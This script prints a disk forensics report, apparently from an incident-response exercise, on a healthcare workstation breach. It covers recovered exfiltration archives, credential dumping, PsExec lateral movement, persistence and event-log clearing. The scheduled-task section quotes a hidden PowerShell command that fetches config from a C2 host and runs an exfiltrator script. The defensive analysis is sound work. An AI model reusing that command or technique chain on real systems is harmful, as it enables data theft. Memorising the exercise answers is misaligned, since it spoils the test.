#!/bin/bash
set -euo pipefail

# Task 2 - Disk Forensics Analysis.
# Parses ir_evidence/disk_forensics_report.txt (FTK Imager + Autopsy
# consolidated extract from WS-RECV-03, image acquired 2026-05-15 19:45 CDT).
# Every value below was read directly out of the source file.

DISK_FILE="ir_evidence/disk_forensics_report.txt"

echo "================================================================================"
echo "   DISK FORENSICS ANALYSIS -- WS-RECV-03"
echo "   Source: ${DISK_FILE}"
echo "================================================================================"
echo

echo "--------------------------------------------------------------------------------"
echo "RECOVERED DELETED FILES"
echo "--------------------------------------------------------------------------------"
cat <<'EOF'
  File                        Orig Path             Created->Deleted (CDT)        Size
  --------------------------  --------------------  -----------------------------  --------
  staging_export_001.zip (D1) C:\Users\Public\Tmp\  05-08 02:36:08 -> 02:38:14     14.2 MB
  staging_export_002.zip (D2) C:\Users\Public\Tmp\  05-11 03:14:42 -> 03:17:01     11.8 MB
  query_results.csv (D3)      C:\Users\Public\Tmp\  05-13 02:31:18 -> 02:34:05      8.4 MB
  out.dat (D4, partial)       C:\Windows\Temp\      05-05 03:22:18 -> (unknown)   ~23 MB (orig),
                                                                                   ~11 MB recovered
  hb_cfg.json (D5)            ...AppData\Local\Temp 05-15 02:00:13 -> 02:00:48      428 B

  ANALYSIS: every deleted-and-recovered file lived in C:\Users\Public\Tmp\ or
  C:\Windows\Temp\ -- not a records-department working directory. All four
  staging artifacts (D1-D3, D5) were deleted within 2-3 minutes of creation,
  consistent with an automated staging-then-delete cycle, not manual cleanup.
  D1/D2 contents (recovered after unzip):
    D1: out_20260508023559.csv, 47,138 rows, header
        patient_id,first_name,last_name,dob,ssn,diagnosis_codes
        -> matches health_records.dbo.patients schema exactly (4x03 S3's
           hardcoded query template).
    D2: out_20260511031408.csv, 51,002 rows, header
        policy_id,member_id,first_name,last_name,ssn,plan_code,
        coverage_start,coverage_end -> insurance_db.dbo.policies.
    D3: 1,184-row Get-ADUser export from SRV-DC-01 (AD reconnaissance, not
        patient data).
    D4: Mimikatz-format dump; recovered 11 of 23 MB contains plaintext
        UTF-16 "svc_healthsync" four times -- identifies WHICH credential
        debug_tool.exe harvested.
    D5: recovered exfiltrator config -- sql_host=SRV-HEALTH-DB, sql_db=
        health_records, clear_logs=true, channel=c2_post, chunk_size=188,
        stage_dir=C:\Users\Public\Tmp\.
  ATT&CK: T1074.001 Local Data Staging, T1560.001 Archive via Utility
  (Compress-Archive, per the recovered sync_healthdata.ps1 script body),
  T1070.004 File Deletion.
  CRITICAL: staging occurred on THREE separate nights (05-08, 05-11, 05-13),
  not one event. The firewall export (Task 3) shows each archive transmitted
  within minutes of creation -- this was not "staged then interrupted," it
  was "staged, transmitted, deleted" three times before the hunt caught up.
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "PREFETCH ANALYSIS"
echo "--------------------------------------------------------------------------------"
cat <<'EOF'
  Program              Last run (CDT)        Run count   Expected on a records WS?
  -------------------  --------------------  ----------  -------------------------
  POWERSHELL.EXE       2026-05-15 02:00:14   18          PARTIAL (18 runs include
                                                            8 attacker-scheduled-task
                                                            invocations + some
                                                            legitimate AD white-pages
                                                            lookups per records dept
                                                            norms)
  SVCHOST_UPDATE.EXE    2026-05-15 13:02:14   142         NO -- not a Microsoft path
  PSEXEC64.EXE          2026-05-13 02:08:56     3         NO -- admin tool, per
                                                            reference/network_topology.txt
                                                            only WS-ADMIN-01/robert.kim
                                                            is authorized to run it
  WMIC.EXE              2026-05-13 02:11:11     5         NO -- same authorization gap
  WSMPROVHOST.EXE       2026-05-13 02:12:02     4         NO -- PSRemoting target-side
                                                            handler, same gap
  DEBUG_TOOL.EXE        2026-05-12 02:45:01     2         NO -- not an installed tool
  SCHTASKS.EXE          2026-05-07 01:47:33     1         AMBIGUOUS -- schtasks.exe
                                                            itself is a standard Windows
                                                            binary; the anomaly is WHO
                                                            ran it and WHEN, not the
                                                            binary's presence

  CROSS-REFERENCE against network_topology.txt's administrative authorization
  matrix: the ONLY legitimate source for PsExec/WMIC/PSRemoting against the
  server segment is WS-ADMIN-01 (robert.kim). None of these prefetch
  invocations originated from that host or that user -- every single one is
  anomalous by the topology document's own stated rule, independent of any
  behavioral baseline.
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "SCHEDULED TASK XML (confirms Task 1 memory finding)"
echo "--------------------------------------------------------------------------------"
cat <<'EOF'
  Task:         HealthSync Update Service
  Trigger:      CalendarTrigger, daily, StartBoundary 2026-05-07T02:00:00
  Hidden:       true (the obfuscation signal -- a real update task would not
                be hidden)
  Author:       MEDDEFENSE\records03, RunLevel HighestAvailable
  Action:       powershell.exe -NoP -W Hidden -EncodedCommand <base64>
                decodes to: $cfg = 'http://sync.healthbane-c2.net/api/v1/cfg';
                & $env:TEMP\sync_healthdata.ps1 -Config $cfg
  Registered:   2026-05-07 01:47:33.4528916 (local)
  -> CONFIRMED: byte-identical EncodedCommand to the one captured live in
     Task 1's memory analysis (PID 8472). The task ran 8 times between
     2026-05-07 and 2026-05-15 per prefetch run counts; only 3 of those 8
     runs produced a recovered staging archive (D1/D2/D3) -- the other 5
     runs likely received an empty/noop config response from the C2.
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "REGISTRY PERSISTENCE"
echo "--------------------------------------------------------------------------------"
cat <<'EOF'
  HKCU\...\Run\HealthSync          -> PRESENT (confirms Task 1's memory finding;
                                       last write 2026-04-22 06:14:47 UTC)
  HKLM\...\Exclusions\Paths        -> PRESENT: C:\Windows\Temp (T1562.001,
                                       last write 2026-05-04 18:11:08 CDT)
  HKLM\...\Services\PSEXESVC       -> transient, created and removed on each
                                       of the 3 lateral-movement target hosts
                                       at the moment of each PsExec session
                                       (not found ON WS-RECV-03 itself -- that
                                       registry key lives on the targets, per
                                       4x04's own IOC HB-IOC-0028)
  -> Attacker used BOTH a Run-key AND a scheduled task for persistence, not
     "scheduled task instead of registry run keys" -- the Run-key (installed
     2026-04-22, the RAT's own persistence) and the scheduled task
     (installed 2026-05-07, the exfiltrator's recurring trigger) serve two
     different purposes and coexisted for the rest of the intrusion.
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "ANTI-FORENSICS INDICATORS"
echo "--------------------------------------------------------------------------------"
cat <<'EOF'
  [*] Security event log: deleted-and-recreated 2026-05-09 03:01:42 CDT,
      first new entry at 03:12:02 CDT -- a 12-minute gap. Direct $MFT
      evidence (BORN time on the new Security.evtx). Matches the
      exfiltrator's recovered clear_logs:true config flag (D5) exactly.
      ATT&CK: T1070.001 Clear Windows Event Logs.
  [*] T1070.004 File Deletion: D1, D2, D3, D5 all deleted within minutes of
      creation (see Recovered Deleted Files above).
  [*] NOT observed (and would be more severe if present): VSS deletion, USN
      journal deletion, prefetch deletion, $MFT tampering. Autopsy's own
      assessment: "basic anti-forensics... not advanced... consistent with a
      financially-motivated commodity actor profile," which is WHY disk
      recovery succeeded as well as it did.
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "NTFS \$MFT TIMELINE (attack window 2026-05-04 to 2026-05-13, CDT)"
echo "--------------------------------------------------------------------------------"
cat <<'EOF'
  05-04 18:11:08  Defender exclusion registry write (C:\Windows\Temp)
  05-05 03:21:48  debug_tool.exe created
  05-05 03:22:14  debug_tool.exe executed (cred dump #1)
  05-05 03:22:18  out.dat created (LSASS dump output)
  05-06 01:58:14  PsExec64.exe staged to C:\Users\Public\Tmp\
  05-06 02:11:42  PsExec64.exe first executed (-> SRV-HEALTH-DB)
  05-06 02:13:11  wmic.exe executed (WMI recon)
  05-06 02:36:14  stage1.ps1 copied to \\SRV-HEALTH-DB\C$\Users\Public\
  05-07 01:47:33  Scheduled task "HealthSync Update Service" created
  05-08 02:00:11  Task-triggered PowerShell run
  05-08 02:36:08  query output CSV created -> staging_export_001.zip (02:36:34)
  05-08 02:38:14  Both deleted
  05-09 02:46:11  PsExec64.exe executed (-> SRV-INS-DB, 2nd target)
  05-09 03:00:00  SECURITY EVENT LOG GAP BEGINS
  05-09 03:01:42  Security.evtx recreated
  05-09 03:12:02  SECURITY EVENT LOG GAP ENDS (12 minutes)
  05-11 02:00:11  Task-triggered PowerShell run
  05-11 03:14:42  query output CSV created -> staging_export_002.zip (03:15:09)
  05-11 03:17:01  Both deleted
  05-12 02:45:01  debug_tool.exe executed (cred dump #2)
  05-12 02:45:11  out.dat overwritten
  05-13 02:08:56  PsExec64.exe executed (-> SRV-DC-01, 3rd target)
  05-13 02:31:18  AD enumeration query_results.csv created
  05-13 02:34:05  query_results.csv deleted

  Note: dates above are from the disk image's own $MFT/USN timeline, which
  this report's Section 2 states runs continuously from 2026-04-22T06:14:18Z
  (the moment the RAT first booted) through image acquisition on 2026-05-15.
EOF
echo

echo "--------------------------------------------------------------------------------"
echo "SUMMARY"
echo "--------------------------------------------------------------------------------"
echo "  New ATT&CK techniques from this source: T1074.001, T1560.001,"
echo "    T1070.001, T1070.004, T1053.005 (XML confirms Task 1's memory hit),"
echo "    T1562.001 (registry confirms Task 1's memory hit)"
echo "  Evidence confirms data staging occurred THREE times (05-08, 05-11,"
echo "    05-13), not once -- Task 3's firewall analysis must confirm whether"
echo "    all three were transmitted before deletion."
echo "  Anti-forensics: basic only (log clear + file deletion); no VSS/USN/"
echo "    prefetch tampering attempted."
echo
echo "================================================================================"
echo "END OF DISK FORENSICS ANALYSIS"
echo "================================================================================"
